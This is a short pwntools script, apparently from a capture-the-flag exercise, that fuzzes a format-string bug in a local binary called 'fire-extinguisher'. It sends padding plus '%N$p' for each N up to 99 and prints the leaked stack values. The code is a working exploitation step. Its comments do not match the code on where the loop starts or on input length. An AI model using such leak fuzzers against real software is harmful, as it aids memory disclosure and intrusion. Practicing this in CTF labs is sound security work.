from pwn import *
import sys

exe = "./fire-extinguisher"
context.binary = exe
context.log_level = "warning"

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(exe)

gdbscript = """
b *main
c
"""
PADDING = 16
# Fuzz positional leaks. Start at 1, not 0.
for i in range(100):
    try:
        p = start()

        # Keep it short so it fits in 16 bytes total including NUL.
        # Example: b"%7$p" or b"%12$p"
        fmt = f"%{i}$p"

        payload = "A"*PADDING + fmt

        p.sendafter(b"what fire are we putting out? > ", payload)

        # The program prints: printf(preamble1, fire);
        # So we read until the next prompt to capture the leak.
        out = p.recvuntil(b"extinguish! >", timeout=1)

        # Print only the leaked portion (strip prompts/noise)
        # This is intentionally simple: you just want to see which i prints interesting values.
        print(f"{i}: {out.decode(errors='ignore').strip().split(" ")[0]}")

        p.close()
    except (EOFError, PwnlibException):
        pass
